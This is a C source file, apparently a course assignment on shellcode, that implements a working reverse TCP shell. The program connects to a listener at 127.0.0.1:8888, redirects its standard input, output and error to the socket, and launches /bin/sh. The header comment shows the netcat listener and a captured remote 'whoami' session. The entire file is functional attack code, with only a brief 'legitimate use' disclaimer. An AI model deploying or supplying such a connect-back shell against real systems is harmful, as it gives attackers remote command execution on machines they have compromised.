/*
 * SLAE - Assignment 2
 *
 * Title: Shell Reverse TCP
 * Author Liviu I. 
 *
 * License http://creativecommons.org/licenses/by-sa/3.0/
 * Legitimate use and research only
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE
 *
 *  Connect back shellcode
 *  
 *  $ gcc -Wall shell_reverse_tcp.c -o shell_reverse_tcp
 *  $ nc -lvvp 8888
 *  Listening on [0.0.0.0] (family 0, port 8888)

 *  $ ./shell_reverse_tcp
 *
 *  Listening on [0.0.0.0] (family 0, port 8888)
 *  Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 60226)
 *  whoami
 *  liv
 *
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>

int main() {
    int sockfd = 0;
    int ret = 0;

    struct sockaddr_in dest;

    // Create an un-named socket. returns socket descriptor
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&dest, '0', sizeof(struct sockaddr));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("127.0.0.1"); 
    dest.sin_port = htons(8888);

    connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr));

    // Duplicate stdin, stdout, stderr
    ret = dup2(sockfd, 0);
    if (-1 == ret) {
        printf("STDIN duplication failed: %s\n", strerror(errno));
        return 1;
    }

    ret = dup2(sockfd, 1);
    if (-1 == ret) {
        printf("STDOUT duplication failed: %s\n", strerror(errno));
        return 1;
    }

    ret = dup2(sockfd, 2);
    if (-1 == ret) {
        printf("STDERR duplication failed: %s\n", strerror(errno));
        return 1;
    }

    // Replace process image
    char *args[2];
    args[0] = "/bin/sh";
    args[1] = NULL;      // Needs to ne a NULL terminated list of args

    ret = execve(args[0], args, NULL);
    if (-1 == ret) {
        printf("Execve failed: %s\n", strerror(errno));
        return 1;
    }

    return 0;
}
